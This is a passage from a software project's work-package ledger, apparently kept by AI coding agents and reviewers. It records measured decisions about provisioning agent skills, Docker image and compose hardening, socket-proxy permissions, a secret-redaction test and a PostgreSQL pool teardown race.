obviously fake `glpat-…` in `TICKETS`' description and asserts a placeholder in
`tasks.ticket_snapshot`. Deleting the `platformRedactor:` line fails that e2e by name with
`expected 'The footer sums the visible rows rath…' not to contain 'glpat-'`.

**3–5, the smaller ones.** Migration 0015 stated the worst case as **162 048** bytes, omitting the
20 × (128 + 128) id and author caps — corrected to **182 528**, and the file is uncommitted and applied
to nothing but throwaway test databases, so it is edited rather than renumbered (fourth wrong number or
cause in two work packages; rule 81). `jobs.ts` claimed the ordinary path cost "one already-loaded
field" while `ensureTicketSnapshot` opened a **second transaction per agent stage** to re-read the row
the handler had just discarded — the code now matches the sentence (the task is handed in), and a named
test drives it with a `UnitOfWork` and a store that throw if entered. The memory store's whole-row
`save` writes `ticketSnapshot`/`ticketSnapshotAt` where the SQL `save` does not; it is the stricter
direction and is now **divergence 5** in that fake's register.

**One number to be exact about wherever it appears:** the 11 408-token worst case is **additive to the
pack, not inside it** — the ticket block and the 12 000-token knowledge budget are separate regions of
the same user prompt. 95 % of a budget and 95 % on top of one read very differently.

**Round 2's three comment-only findings, and the one worth carrying.** The `TaskManagementBinding.redactor`
docblock still said step 2 was *not* applied and cited a "Discovered work" entry the same round had
deleted — **a wrong cause created by the fix**, which is the fifth across WP-17 and WP-15f (rule 81) and
the most instructive: closing a gap turns every sentence that described the gap into a false one, so the
sweep is rules 63 and 49 together — *when you close a gap, grep for the sentences that documented it*. The
grep found four more sites saying `ticket_snapshot` is *"served through the API"*, which no task DTO does
today (`loader.ts`, `apps/server/src/pipeline.ts`, the ingress e2e, and this ledger); all now say "will",
and exposing it is Q48's neighbourhood rather than a thing this row did. And `readTicketSnapshot` fails
open on `BindingLoadError` too — defensible under rule 20 and now **enumerated** at the line with the
asymmetry stated: the same misconfiguration fails `runIntakeCheck`'s branch check loudly, so the quiet
branch degrades a prompt rather than hiding an operator error.

## WP notes — session 5 (decisions, assumptions, reviewer findings)

### WP-14a — the ten skills and the provisioning copy

**What exists now.** `packages/prompts/skills/<name>/SKILL.md` × 10 (product/13's list, ~2.1–2.6 kB
each), loaded eagerly by `packages/prompts/src/skills.ts`; `SKILLS_BY_ROLE` in the planner beside the
two other least-privilege tables; `WorkspaceSpec.skills`; a `skills-<run-id>` helper container in
`DockerWorkspaceProvider.create` that writes them into the workspace; the same files in the fake
provider's tree; `Options.plugins` in `runner/options.ts`; and a digest of the run's skill set folded
into `runs.prompt_version` (`skillSetVersionOf`, `@platform/domain`).

**The measurement that decided the layout, because technical/04's line does not work.** That page
said *"copy platform skills into the workspace `.claude/skills/_platform/` at provisioning"*. Run
against the pinned CLI (the binary `@anthropic-ai/claude-agent-sdk@0.3.267` resolves) by reading the
`skills` field of its `system`/`init` message:

| fixture | discovered? |
|---|---|
| `.claude/skills/flat-skill/SKILL.md` | **yes** |
| `.claude/skills/_platform/nested-skill/SKILL.md` | **no** (twice, two fixtures) |
| `<parent-of-cwd>/.claude/skills/parent-skill/SKILL.md`, cwd a **git root** (the shipped case) | **no** |
| the same, cwd **not** a git repository | **yes** — so the boundary is the repository, not the depth (narrowed by the reviewer's re-derivation) |
| plugin dir holding `skills/<name>/SKILL.md`, via `Options.plugins` | **yes**, as `agentic:<name>` |
| `dir-name-here/SKILL.md` whose frontmatter says `name: frontmatter-name` | listed as `dir-name-here` |

So the shipped layout is `<checkout>/.agentic-run/plugins/agentic/skills/<name>/SKILL.md` plus one
`--plugin-dir`, and technical/04 carries an amendment with the table. The flat alternative — writing
into the project's own `.claude/skills/` — was rejected twice over: the platform's ten names would
share a namespace with the project's (a repository with its own `kb` either loses it or shadows
ours), and the files sit where `git add -A` sweeps them into the merge request. The plugin directory
collides with nothing, and `.git/info/exclude` (local to the clone, never committable) keeps it out
of the checkout's status — asserted in a real container with a canary, because the first draft of
that case asserted only that a command printed nothing.

**Decisions and assumptions**

- **The copy comes from the launcher's own filesystem, not from the run image.** `@platform/prompts`
  is now a dependency of `apps/launcher`, and `docker/launcher.Dockerfile` already copies `packages/`
  wholesale — so **no image rebuild was needed** and none was done. The reason is not packaging
  convenience: the digest the planner records in `prompt_version` is computed from the bytes *this
  deployment* has, and an image is separately deployable, so bytes from an image would let the audit
  describe a file the run never saw.
- **The restriction is the provisioning copy, not the SDK option.** `skills` is "a context filter,
  not a sandbox … their files remain on disk and are reachable via Read/Bash" (`sdk.d.ts:2089-2098`),
  so a role's skills are decided by what `create` writes. The option is emitted as the second lane,
  and only when the list is non-empty — for the triager (no tools, no skills) nothing is copied and
  no plugin is passed, which is the stronger half anyway.
- **Q67 filed and implemented: the per-role list replaces project-skill discovery.** There is no
  "these **and** the project's" form of the option. BD-025 trusts `.claude/` only from the default
  branch while a re-entry checks out the task branch, so the explicit list also closes a hole an MR
  could use. The cost is stated in the question and in the `kb` skill, which therefore does **not**
  tell agents to prefer project skills.
- **`SKILLS_BY_ROLE` follows product/13's least-privilege table, not the shipped `TOOLS_BY_ROLE`.**
  The two disagree about the investigator (product/13 gives it read-only shell and observability;
  `TOOLS_BY_ROLE` gives it no `Bash`), so `loki-logs`/`sentry-issue` name commands that role cannot
  currently run. Recorded as discovered work rather than fixed here.
- **Eval cases: none, and TD-016 has no place for one.** `RoleEvalSet` is per **role** and keyed by
  an `artifact_type`; a skill produces no artifact and belongs to several roles. Writing a
  skill-shaped case set would mean a new file shape, a new loader and a new offline schema check for
  something no credential can run. The offline guarantee for skills is
  `packages/prompts/src/skills.test.ts` (census off disk, frontmatter, size, the `## Never` section)
  and `test/contract/prompts/platform-skills.contract.test.ts`.
- **No role prompt was changed, so `ROLE_PROMPT_VERSIONS` is untouched.** The CLI lists a skill's
  description to the model itself; naming the ten in ten prompts would duplicate that listing and
  bind the prompts to the plugin-qualified spelling.
- **Every CLI recipe in a skill was verified against the binary in `platform-runtime:dev`**, and two
  were wrong as first written: `acli jira workitem view` takes the key **positionally** (not
  `--key`), and `jira issue list/view` need `--plain` or they render an interactive table a
  non-interactive run cannot page. `glab mr view/diff/note list`, `glab ci status/trace` and
  `logcli query --since/--from/--to/--limit` are as written.
- **`sentry-cli` 3.7.0 has `issues list --query --max-rows` and `events list`**, which the Sentry
  provider's docblock — reading the vendor's documentation page on 2026-09-10 — says it does not.
  The skill uses the measured commands and says `--help` is the authority; the provider's `cli: null`
  is unchanged, because what is still unverified is the *environment* such a query authenticates
  with. Discovered work.

**Review round 1 (three findings, all fixed).** (1) *rules 44/86* — four skills asserted a
credential the platform does not inject (`agentRunEnvironment` puts only `ANTHROPIC_API_KEY` into a
run and nothing reads `AgentTooling.env`; backlog **40** cause (b)). All four are hedged to what is
true today, and `test/contract/prompts/platform-skills.contract.test.ts` now enforces two rules with
the defect planted in a copy to show each can fail: **no skill claims a credential**, and **a skill
naming one of the run image's CLIs is either backed by a provider's `AgentTooling.cli` or carries
the hedge sentence**. The second is a stated deviation from the review's literal "tied to a non-null
`AgentTooling.cli`": `acli`, `jira` and `sentry-cli` are in the run image while Jira declares no
tooling and Sentry no CLI, so the literal rule would delete recipes for binaries that are there and
usable when a project's own binding supplies a credential. The residual is at the line — both checks
read prose with regular expressions. (2) The `SKILLS_BY_ROLE` docblock now records **all three**
mismatches with the shipped tables (no `Bash` for the investigator *or* the product manager; neither
holds `add_ticket_comment`/`create_followup_ticket`, which `jira-ticket` names; role-driven rather
than binding-driven), pointing at backlog **39**; the skill itself now says those tools are "when
your tool list has them". (3) The fake no longer writes `.git/info/exclude` for a spec with no
skills, where the provider writes nothing — no divergence remains on that line.

**Review round 2 (approve with four).** Three more unbacked sentences, all found by reading the
tree rather than by a check: `kb` sent agents to `.agentic-run/context/` (nothing writes it —
`assemblePrompt` hedges the same sentence), `sentry-issue` said the Sentry MCP server "is mounted"
(`mcpServers: {}` reaches every run and the integration declares none), and `ask-human` described a
timeout for a tool `apps/server/src/platform-tools.ts` **refuses by name** today. All three now say
what is true, and the contract test grew the two rules that would have caught the first two — a path
under `.agentic-run/` must be hedged, and "is mounted" must be backed by an `AgentTooling.mcp` or be
a denial — each planted on a copy. The **`ask-human` class is still unguarded** and the docblock's
residual says so: nothing checks a claim about a platform tool, an event or a pipeline behaviour.

**Sentences fixed under rule 83** (grep for the claim, not for the file): Loki's `skill: null`
docblock (`providers/loki/provider.ts`), Sentry's "mounts no CLI, no MCP server and no skill"
(`providers/sentry/provider.ts`), GitLab's dangling `skill.path` (`providers/gitlab/index.ts`),
`skillRefSchema`'s "read by nothing" (now names its reader,
`ports/integrations/common.ts`) and the planner's `skills: []`. **Left for the orchestrator**, being
ledger- and backlog-owned: backlog entry **24** ("nothing mounts a skill"), the WP-17 notes, and
`docs/TODO.md`'s *"Nothing mounts a platform skill"* item, which this work package closes.


### WP-22 — images and compose

**What exists now.** Five Dockerfiles (`docker/{base,runtime,egress,app,launcher}.Dockerfile`), one
`compose.yml`, `scripts/build-images.mjs` as the only place that knows which file makes which image
and what each may weigh, `.github/workflows/{image,base-image}.yml`, and the workspace e2e running
against the **real** `platform-runtime` and `platform-egress` with `runtimeSourceDir` unset and no
`egressCommand`. Measured sizes: base **547 MB**, runtime **1.32 GB**, egress **13.2 MB**, product
**1.1 GB**, launcher **966 MB**.

**The rule 27 instance, first, because it is the one a reader should not miss.** Backlog 7 says the
rendered egress config *"will not start the real image as written"* — `User nobody` against
`cap_drop ALL`. **Measured against tinyproxy 1.11.2 with both lines present: it starts, stays up as
uid 1000, proxies to an allowed host (200) and refuses a filtered one (403, "Proxying refused on
filtered domain"), and does not even warn.** The prediction was made by reading the documentation.
The lines are removed anyway, for the reason that survives: the process does not honour them, so
they are a claim about this container that nothing enforces (rule 3), and a trap for the day
somebody starts the sidecar as root. `FilterExtended On` became `FilterType ere` — the same setting
under the spelling the pinned binary asks for (`deprecated option FilterExtended, use FilterType`).

**Backlog 27's mutant measurement, answered both before and after.** With `#waitForControlSocket`
shortened to a single look (`if (true as boolean)`, on the tree, reverted with the Edit tool — rule
77): the **pre-existing** e2e case *"attaches to a running workspace with a control socket and a
token"* **passed** (6913 ms) and *"refuses to attach after the workspace has been killed"* passed —
so that tier certified the happy path and not the wait. The new case *"attaches to a workspace whose
socket appears only after attach"* **failed by name**, and passes unmutated. It forces the ordering
rather than waiting for it (rule 76): remove the socket while the container runs — nothing can
recreate it, because the only thing that creates it is a shim starting and this one has already
started — call `attach`, *observe* the absence from a container, then `docker restart` so a second
shim listens.

**The shim could not start on this machine with the real image, and that is backlog 27's second
question answered.** `chmod 0600` on a Unix socket in a bind-backed volume answers `EINVAL` on
Docker Desktop's virtiofs; the mode cannot be set at creation either (with `umask(0o177)` the guest
reports `0666` while the host reports `0755`, so it is synthesised rather than stored). The shim
exited 1 **after** creating the socket, so `#waitForControlSocket` saw a socket file and `attach`
failed on the *container* being `exited`. The old stand-in hid it by being slow: booting the shim
through the TypeScript resolver took seconds, so `attach` inspected a container that was still
starting. The fix checks the **property** instead of the call —
`assertControlDirectoryProtects`: `<ctl>/<run-id>` is `0700` owned by this uid (the launcher creates
it that way) and a Unix socket cannot be connected to without search permission on every directory
in its path, so the directory denies exactly the set the `0600` would. It **still refuses** when the
directory does not carry that property, naming both facts, and `shim.test.ts` asserts both
directions. Linux is unaffected.

**Two defects a deployment found that no tier could.**

1. **`@platform/prompts` imported `@platform/contracts` and declared no dependencies at all.** In a
   developer checkout it resolves through the *root*'s `devDependencies`; in the product image
   (`pnpm install --prod`) it is `ERR_MODULE_NOT_FOUND … imported from
   /app/packages/prompts/src/index.ts`, and the container crash-looped on an image whose every other
   layer was right. Declared, and the class is closed by `scripts/workspace-deps.test.ts` — a census
   over `git ls-files` (tracked **and** untracked, rule 85) that reproduces the original by name when
   the declaration is removed.
2. **The launcher container could not stay up.** `systemClock.setTimer` unrefs, deliberately, and the
   launcher has no server, no socket and no queue worker — so the retention sweep's timer was the
   only handle it owned, `main()` returned, and the process exited 0. `restart: unless-stopped`
   looped it about once a second with no error anywhere and a sweep that never ran. `launcherClock`
   (the same clock without the unref) is now what holds it; `runtime.test.ts` asserts `hasRef()` in
   both directions.

**A volume leak with two halves, and round 1 fixed one of them.** `alpine/git` declares
`VOLUME /git`, so every container made from it owns an anonymous volume, and a removal that does not
ask for `v` leaves it — invisible to any label sweep, because an anonymous volume carries no labels
(rule 60's shape one level down). One `verify:e2e` run left **220** of them on this machine.
`DockerEngine.removeContainer` now sends `v=true`, which removes anonymous volumes and **never** a
named one — `runlet-launcher-check`'s *"the workspace volume outlives the run, per retention —
kept"* is the empirical proof of the second half.

**Round 1 stopped there, and the reviewer caught the rest**: the *harness's* own `docker rm -f`
(the fixture cleanup, the egress target, the container check's containers) omitted `-v`, so one
volume per run survived — which is what the orchestrator's +1 was, `alpine/git`'s `/git` and not
testcontainers' postgres as this note first guessed. Both sides now pass `-v`. Measured across the
full target: **18 564 volumes before `verify:e2e`, 18 564 after** (0 leaked, where round 1's run left
1); per case, 6 → 0. `docker/egress.Dockerfile` carries no `VOLUME` for the same reason.

**The launcher is no longer on the `default` network** (round 2): it has the daemon and no reason to
reach `db` or `app` — no database connection, no transport to the platform (Q52) — so it joins
`docker-proxy` and `run-egress` only. It stays on `run-egress` for a mechanical reason worth knowing:
compose drops a network no service joins, and the launcher attaches every run's sidecar and helpers
to that network **by name** without creating it, so an unjoined declaration would fail the first run
with `network not found`.

**What `docker compose up` was measured to do** (all four services, on this machine, ports moved to
18080 because 8080 was taken): `db` healthy → `migrate` applied **17 migrations and exited 0** →
`app` healthy with `/healthz` 200, `/api/version` 200 and `/readyz` **ok on all four checks**
(database, migrations, queue, dispatch) → `launcher` up, one line, no restart loop. The socket
boundary was asserted rather than claimed: from the launcher, `GET /containers/json` 200,
`/images/json` 200, `/info` 200, `/secrets` **403**, `POST /build` **403**, `/nodes` **403**; from
the app, `DOCKER_HOST` empty, no `/var/run/docker.sock`, and the proxy **unreachable** (connection
refused, `000`). One residual worth knowing before reading `EXEC: 0` as a guarantee: with
`CONTAINERS=1` and `POST=1` the proxy admits **`POST /containers/<id>/exec` (201)** — an exec
*instance* can be created — while `POST /exec/<id>/start` and `GET /exec/<id>/json` are **403**, so
it can never be run or read. That is recorded in the compose file at the line.

**Decisions taken here, each also in technical/11's amendment.**
- **The product image runs the TypeScript sources**, not a `dist/`: `node --import
  ./scripts/ts-source-resolver.mjs apps/server/src/main.ts`, and `migrate` is the same entrypoint
  with `migrate.ts`. There is no build step for the server rings; this keeps one code path, so the
  bytes CI tested are the bytes the image runs. `apps/web` **is** built by Vite into
  `/app/apps/web/dist`.
- **The six agent CLIs moved from `platform-base` to `platform-runtime`.** With them in the base it
  is 1.0 GB and the product image cannot meet technical/11's own ≤ 1 GB check, while the run
  container — the only thing that uses them (`AgentTooling.cli` is "what an agent may be handed
  inside a run") — would carry the platform's server dependencies.
- **The size check is per image**, each about a third above what it measures, because one number
  cannot hold an image with a 217 MB `claude` binary in it.
- **An override file for local mode, not a profile** — corrected in round 2, and the correction is
  the interesting part. `COMPOSE_PROFILES=local` with a second `app-local` service *adds* a service:
  compose starts every service that has no `profiles` key, so both ran and both published
  `${APP_PORT}:8080`, the second failing to bind (`docker compose config --services`). Compose has no
  "instead of". Local mode is `-f compose.yml -f compose.local.yml`, which is technical/11's original
  layout, and `test/e2e/compose/compose-config.e2e.test.ts` asserts the service set and the port
  publishers under the default, the override, an enabled `local` profile and `backup` — the first
  version of that test pinned `COMPOSE_PROFILES=''` and could not see a profile-gated service at all,
  which re-introducing `app-local` proved by leaving it green. It does **not** mount a host `claude`
  binary, because the CLI runs in the run container and technical/05 forbids a host mount there.
- **The `ctl` volume is not mounted into `app`.** It holds every live run's token, `apps/server`
  composes no provisioner in this build, and the service that gains the mount is the one that gains
  Q52's transport.
- **`agentic-repo-cache` is not declared in compose** (the launcher creates it, and compose drops an
  unused declaration), so `docker compose down -v` leaves it. Said in the file.
- **Signing needed no credential.** `gh secret list` is empty and there are no environments, so
  rather than a blocker brief this is `actions/attest-build-provenance` over the workflow's OIDC
  identity. **No SBOM attestation**: BuildKit can only attach one when *it* pushes, and these images
  are pushed by `docker push` after a plain build so one script builds everywhere. Stated in
  technical/11 rather than claimed.

**Refused, with the measurement — backlog 0b's per-run control volume.** Its stated evidence is gone:
the `CAP_DAC_OVERRIDE` the entry calls "the evidence the shape is wrong" was already removed at WP-14
(the two-helper teardown, `#removeControlDirectory`), and `grep -rn DAC_OVERRIDE` over the tree finds
three comments and no capability. What is left of the entry is the volume, and a **per-run** control
volume contradicts two decisions at once: TD-025 §2 gives the runner a *static* mount of the whole
`ctl` volume precisely so nothing has to mount a volume per run, and TD-021's WP-15g amendment
forbids the process that composes the pipeline from holding a Docker client — so a per-run volume
would need either a dynamic mount from the runner (a Docker client in the server) or a second
transport that does not exist (Q52). The rule-60 half is *not* the volume: the shared `ctl` volume is
labelled `role=shared` and visible; what no sweep sees is a **directory** inside it, which is stated
at `#removeControlDirectory` and is a different fix (an orphan-directory sweep in `purgeExpired`).
Filed as discovered work rather than done, because it is a change to the launcher's sweep and not to
the image layout this row owns.

**Assumptions, stated because the docs did not decide them.**
- `base-image.yml` **builds and does not push**: publishing from a schedule would put an image in the
  registry that no commit produced. What the weekly run buys is the signal that a pin has rotted.
- `image.yml` merges per-architecture **tags** rather than digests, because five images' digests
  would otherwise be passed between jobs; the arm64 half runs on `ubuntu-24.04-arm`, which this
  repository has never used — the first CI run is the measurement (rules 71, 84).
- CI's `e2e-fake-claude` job **builds** `platform-runtime` and `platform-egress` rather than pulling a
  published tag. The row asks for "a tag the e2e job pulls" so that no case skips; building the
  commit's own images is strictly stronger (it tests *this* commit) and needs no registry round trip,
  and the no-skip half is enforced where it belongs: `ensureImages` throws, naming
  `node scripts/build-images.mjs runtime egress`, when a `platform-*` image is absent.
- `acli` is the one CLI that cannot be version-pinned — Atlassian publishes a `latest` path only. It
  is behind an `ACLI_URL` build argument, the version in the image today is **1.3.36-stable**, and
  `docs/TODO.md` carries it.

**The sidecar check caught the shape it was written for, in a script rather than in a test.**
`scripts/runlet-launcher-check.mjs` passed `alpine:3.21` as the egress image with no command — the
exact stand-in backlog 7 describes — and `create` refused the run with *"the egress sidecar is
exited (exit 0) after create, so the workspace's HTTPS_PROXY points at a container that is not
running (image alpine:3.21)"*. The script now passes `platform-egress`, and **7/7 checks pass**
against it (`PASS: runlet-launcher-check`), including "the workspace volume outlives the run, per
retention — kept", which is also the empirical proof that `v=true` removes anonymous volumes and
never a named one. Its outer container needed `--entrypoint node`, because `RUNTIME_IMAGE` is now an
image whose entrypoint is the shim: without it the container answered `unknown mode "node"`. That
container is the platform side and only borrows the image for a Node runtime.

**Round 2: four things review found that measurement had not, three of them mine to have measured.**

1. **A false measurement in the tree, written by me.** `docker/egress.Dockerfile`'s docblock quoted
   `tinyproxy: Unable to change to user "nobody"` *(exit 1, before the listener exists)* as observed.
   It never was: it is the prediction from backlog 7, and my own run three paragraphs above says the
   opposite. Every other site — this note, `egress.ts`, `egress.test.ts`, `docs/TODO.md` — carried
   the measured result, so the one file that mattered to a reader of the image was the one that
   lied. Rewritten to the measurement. Rule 39's mirror: a *false* measurement beside four true ones
   is not caught by re-reading the true ones.
2. **`docker build` does not forward the environment to an `ARG`.** `image.yml` exported
   `APP_VERSION`/`APP_COMMIT`/`APP_BUILT_AT` as step env and the script passed only `BASE_IMAGE`, so
   every published image would have reported `0.0.0-dev`, `commit: null` at `GET /api/version` — the
   defect is silent by construction, because the image builds, runs and serves. The script passes
   them as build arguments now and **asserts the artefact**: after a versioned build it reads
   `Config.Env` and fails naming what did not land. Measured both ways —
   `APP_VERSION=1.2.3-test … node scripts/build-images.mjs platform` puts
   `APP_VERSION=1.2.3-test`, `APP_COMMIT=abc1234deadbeef` and `APP_BUILT_AT=…` in the image, and the
   same guard over an image whose Dockerfile declares no such `ARG` fails with
   `FAIL: platform-egress:dev did not take APP_VERSION` (exit 1).
3. **The size check measured a different quantity from the one the budgets were derived from.**
   `docker image inspect --format '{{.Size}}'` answers **130 357 549** for a `platform-base` that
   `docker images` calls **547MB**: on a containerd image store that field is the *compressed
   content*, i.e. the pull size. So every ceiling was loose by about 4×. `docker save … | wc -c` was
   tried as the review suggested and is **the same quantity here** (130 378 240 B) — it exports the
   blobs as stored — so it is not the store-independent measure it looks like. The script now reads
   `docker images --format '{{.Size}}'`, the unpacked total both stores report, states which quantity
   the budgets bound, and refuses a string it cannot parse. Today's numbers, unpacked (compressed):
   base 547MB (130 MB), runtime 1.32GB (328 MB), egress 13.2MB (4 MB).
4. **The fallback caught more than it was for.** `assertControlDirectoryProtects` was reached from a
   bare `.catch`, so any `chmod` failure — `EPERM`, `ENOENT`, `EIO` — would have been answered by the
   directory's mode. It now handles `EINVAL`/`ENOTSUP`/`EOPNOTSUPP` and re-throws the rest, and the
   `stat.uid !== uid` half of the condition has a case of its own (it had none: every case varied the
   mode).

**Round 3: two of them are guards that could not fail, which is the recurring shape of this row.**

1. **The backup service could never have backed anything up.** `db-backup` was pinned to
   `prodrigestivill/postgres-backup-local:17` against `postgres:18`, and `pg_dump` refuses a server
   newer than itself: *"aborting because of server version mismatch / server version: 18.6; pg_dump
   version: 17.6"*, measured by the reviewer against that exact digest. A nightly job that fails
   identically every night, into a log nobody reads, beside a file claiming it "writes a compressed
   dump per schedule". Now `:18` (`pg_dump --version` → **18.0** at the pinned digest), and the two
   majors are **compared off the file** by `compose-config.e2e.test.ts` rather than listed anywhere,
   so a bump of one without the other fails with `expected '17' to be '18'` (measured, on a copy).
2. **The case guarding the un-`unref`ed sweep timer passed with the defect present.** It read
   `hasRef()` off a plain `setTimeout` it had created itself and never looked at the handle
   `launcherClock` returned, while its own docblock said "both directions" — rule 3 inside a test.
   A `RunnerClock` hands back a cancel function, not the handle, so the only way to read the ref is
   to intercept `globalThis.setTimeout`; both clocks now go through one helper that does. Calibrated
   with the Edit tool in place and reverted: `.unref()` restored fails it by name
   (`expected false to be true`).
3. **The dependency census saw one of three import spellings.** `from '…'` only, so a side-effect
   `import '@platform/x';` and a dynamic `await import('@platform/x')` — the two forms a package
   reaches for when it wants something it has not declared — were invisible to the guard written for
   exactly that class (rule 48's shape). All three now, each planted on an untracked probe file in
   `packages/domain/src/` and each caught by name; the spellings it still cannot see are listed in
   its docblock.
4. **`build-images.mjs` ended with a stack instead of its verdict line** when a size could not be
   read. Caught, and the run prints `FAIL: … built, but its size could not be read: …` plus the
   `FAIL: build-images` line (measured on a copy with the format string broken).

**CI was the first honest measurement of `runlet-container-check.mjs`, and it found one thing
(rule 71).** The script had only ever run on developer machines; the first CI run of it failed 6/7 on
*"embedded DNS resolves a container by name on an internal network"* — `SERVFAIL` for
`agentic-runlet-check-peer.<id>.<region>.cloudapp.net` — which is the **same** environment defect the
WP-14 ci-fix closed for the workspace e2e (a cloud runner's host has a `search` line, a laptop does
not, busybox `nslookup` queries the suffixed name too, and an `internal` network has no route
upstream). Everything else passed on Linux against the real image, including the SDK `query()`
through the shim. The probe now uses `getent hosts` and asserts the **address** — calibrated by
looking up a name that does not exist (rc 2, 6/7) — and rule 49's sweep found this script *was* the
sibling nobody grepped for at WP-14; there are no others.

**What is proved on Linux CI versus only here (rule 71).** Everything above was measured on macOS
against Docker Desktop 29.7.2, `linux/arm64`. Three things this machine cannot answer: whether the
amd64 images build at all (only arm64 was built), whether `ubuntu-24.04-arm` runners are available to
this repository, and the uid/permission behaviour of the control volume on a Linux runner — where the
bind is a real filesystem, `chmod` on a socket succeeds, and the directory-mode fallback is never
taken. The first green `image.yml` and `e2e-fake-claude` runs are the first honest measurements.

### Backlog 28 — the e2e teardown 57P01, measured and closed

**The hypothesis was right about the mechanism and wrong about the shape of the leak.** Entry 28
guessed that a client "is still connected at that moment". It is — but not because anybody forgot to
close it. Three measurements, each a throwaway file run against the tier's own PostgreSQL 18
container and then deleted:

1. Start a `default-composition`-shaped instance, `await instance.runtime.stop()`, then ask
   `pg_stat_activity` which backends are left on its database: **none**. So `stop()` is not leaking a
   pool, and the losing order is **not** the file's `afterAll` against the global teardown.
2. Hold an idle client in a pool and run `drop database … with (force)`: an **uncaught exception**,
   `code 57P01`, with the dead `Client` hanging off the error as `err.client` — which is where CI's
   serialized `database: 'default-composition_…'` and `port: 32769` came from. So the delivery path
   is `pg_terminate_backend` → FATAL → pg-pool's `makeIdleListener` → `pool.emit('error')` → thrown,
   because an `EventEmitter` throws an `'error'` nobody listens for. **No pool in this repository had
   a listener.**
3. The window itself: listen for pg-pool's `remove` event, then `await pool.end()`. The order is
   `['end-resolved']` and only a tick later `['end-resolved', 'remove-event']`, with the removed
   client's socket reporting `destroyed === false` at the moment `end()` resolved. `Pool._remove`
   filters the client out of `_clients` and calls `client.end()` **without awaiting it**, and
   `_pulseQueue` fires the end callback as soon as that array is empty.

So: **`database.close()` returns while its sockets are still attached, and `database.drop()` runs on
the next line.** Locally the admin connect inside `withAdminClient` is slower than the socket close,
which is why it has never failed here; on a loaded Linux runner it is not. A bare `pg.Client` does
**not** have this property — `client.end()` resolves on the connection's `end` event — so a client
the caller closed is genuinely closed, and only pools needed fixing.

**The fix is in two places with deliberately different rules.**

- **Production** (`packages/infrastructure/src/db/pool-errors.ts`, wired at the single
  `createDatabasePool` site and given `apps/server`'s pino logger). The listener **reports and keeps
  serving**: a connection loss (`57P0x`, `08003/08006`, `ECONNRESET/EPIPE/ETIMEDOUT`) at `warn`,
  anything else at `error` naming the code. This is also a production defect the CI flake exposed —
  before it, a PostgreSQL failover or a `pg_terminate_backend` against an **idle** pooled connection
  would have taken `apps/server` down. Two precedents decided the shape: pg-boss's `onError` and the
  `LISTEN` connection's `onError` both log and continue.
- **The harness** (`createTestPool` in `test/integration/support/postgres.ts`). It swallows
  **exactly** `57P01` and **re-throws everything else**, because a harness that hides a database
  error hides it from the only person who would have fixed it. The asymmetry is stated at both lines.

**Asserted from both sides.** `test/integration/support/postgres.integration.test.ts` drops a real
database with `(force)` while the pool holds a live idle client and asserts no uncaught exception
reached the process **and** that the swallow branch ran on `57P01`; a sibling case shows the same
listener re-throwing `42P01`; a third case runs the same drop against the pool `createDatabasePool`
builds — the one that actually failed in CI — and asserts the `warn`. Rule 76: the interleaving is
made certain (the client is still live) rather than waited for, so nothing here is rate-dependent.
`packages/infrastructure/src/db/pool-errors.test.ts` pins the premise (an `EventEmitter` throws an
unlistened `'error'`) and both classifier branches.

**Mutation-checked on copies, calibrated first** (rules 3/21/62/77). Deleting the harness listener:
the acceptance case fails on `expected [ …(1) ] to deeply equal []`, printing the identical `57P01`
CI printed. Making `isConnectionLoss` always true: the unit case fails on the `error`-level branch.
Planting a new unguarded `new pg.Pool` and marking it tracked: the census fails naming the file.
All copies deleted; `git status` verified unchanged afterwards.

**Rule 49 sweep — the siblings, counted.** Thirteen pool-construction sites existed: one production
(`db/client.ts`) and **twelve** in the harness across ten files (`test/e2e/pipeline/composition`,
`test/e2e/support/pipeline`, and eight integration files, `outbox` holding two). All twelve now go
through `createTestPool`; the production one is guarded in place. Ten further pools come from
`db.createDatabasePool` in `grants`/`pg-boss-jobs` — those files need a *production* pool, because
one tests the factory and the other hands pg-boss the pool a runtime would — and review round 1 was
right that "guarded by the same change" was too kind to them: the guard's default logger is
`silentLogger`, so those ten would have swallowed **every** idle-client error without a trace, which
is weaker than production (which logs) and weaker than `createTestPool` (which re-throws). They now
pass `strictPoolLogger`, the harness's filter through the guard's only seam: the `warn` branch a
connection loss takes is dropped, and the `error` branch a code nobody recognised takes **throws**.
Asserted from both sides in `postgres.integration.test.ts`, and mutation-checked on a copy —
replacing that `error` with `silentLogger`'s empty function fails the case on
`expected [Function] to throw an error`. The harness drops a database in exactly **one** place (`postgres.ts`'s `drop()`); the only
other `drop database` in a tracked file is a SQL-injection payload in `grants.integration.test.ts`.
Four e2e files start an `apps/server` instance (`composition`, `auth`, `sse`, plus `support/pipeline`
through `support/instance`) and all reach the runtime pool through the same factory. A new bare pool
is now refused by the census in `pool-errors.test.ts`, which allows exactly the two factories — and
whose docblock now lists what a text census **cannot** see (an aliased import, a pool built by
another factory, a reflective construction, a pool a dependency opens for itself), so it reads as
the floor against an accident that it is rather than as a proof.

**The census failed its own rule twice, and both failures are the interesting part.**

1. **Rule 59, on day one.** The docblock written for review round 1 — the one listing the spellings
   the regex catches — *reproduced the matched form*, so the file became a pool site the moment it
   was tracked. It now states the shape in words (the `new` operator, whitespace, an optional `pg.`
   qualifier, the identifier, an opening parenthesis) and the planted fixture assembles its source
   rather than writing it out. The positive proof lives in a test, not in a sentence.
2. **Backlog entry 10's class, second instance.** Nothing caught (1) locally, because every run
   before the orchestrator's commit read a set that did not contain the new files: the census swept
   `git ls-files` only, and an untracked file is invisible to it — which is precisely entry 10's
   finding about `nul:check`. It now sweeps `git ls-files` **and**
   `git ls-files --others --exclude-standard`, on the one-line rule *an ignored file is not a source
   file, and an untracked one is*. Asserted by a case that builds a throwaway repository with a
   tracked, an untracked and an ignored pool file and expects exactly the first two, and checked
   against the real checkout by planting an untracked unguarded pool, which the census named.
   **`nul:check` still has the gap** — entry 10 is untouched here and remains open on its own terms.

**Review round 1's other nit, worth keeping as a rule rather than a fix.** The positive loop in
`pool-errors.test.ts` restated seven of the eight codes by hand and had already lost `ETIMEDOUT` —
a second place to forget a code, two days old. It now iterates `CONNECTION_LOSS_CODES` itself (rule
68), with a size floor and a `has('57P01')` so an emptied set cannot make the loop vacuous.

**Not done here, and deliberately.** Review round 1 also asked for a line in `CLAUDE.md` § Conventions
recording the two-factory rule beside the other enforced censuses. This implementer's operating
instructions say in as many words that no agent message can authorise changing `CLAUDE.md`, so the
sentences were handed to the orchestrator to apply rather than written here. It is the only item of
the round left open. **Applied by the orchestrator** in the same commit: the bullet sits in
`CLAUDE.md` § Conventions after the `.gitignore` anchoring rule.

